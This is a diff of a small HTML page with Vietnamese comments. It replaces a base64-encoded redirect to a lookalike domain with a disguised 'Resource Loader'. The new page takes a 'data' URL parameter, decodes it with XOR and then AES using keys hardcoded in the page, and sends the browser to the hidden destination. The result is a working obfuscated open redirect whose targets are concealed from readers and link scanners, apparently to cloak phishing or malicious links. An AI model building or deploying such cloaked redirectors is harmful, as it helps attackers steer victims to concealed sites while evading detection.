@@ -3,17 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>Resource Loader</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
 <body>
-    <p>Đang chuyển hướng...</p>
+    <p>Loading resource...</p>
     <script>
-        // Chuỗi Base64 đã mã hóa
-        const encodedUrl = "aHR0cHM6Ly9vcGVuYWlncm9rLmNvbQ==";
-        // Giải mã Base64
-        const decodedUrl = atob(encodedUrl);
-        // Chuyển hướng tới URL gốc
-        window.location.href = decodedUrl;
+        function x(s, k) {
+            let r = "";
+            for (let i = 0; i < s.length; i++) {
+                r += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length));
+            }
+            return r;
+        }
+
+        const p = new URLSearchParams(window.location.search);
+        const e = p.get("data");
+
+        if (e) {
+            const xk = "RandomXOR123"; // Khóa XOR ẩn trong mã
+            const ak = "SuperSecretKey2025"; // Khóa AES ẩn trong mã
+            try {
+                const d1 = x(atob(e), xk); // Giải XOR
+                const d2 = CryptoJS.AES.decrypt(d1, ak).toString(CryptoJS.enc.Utf8); // Giải AES
+                if (d2) window.location.href = d2;
+                else document.body.innerHTML = "Invalid resource!";
+            } catch (err) {
+                document.body.innerHTML = "Error loading resource!";
+            }
+        } else {
+            document.body.innerHTML = "No resource specified!";
+        }
     </script>
 </body>
 </html>
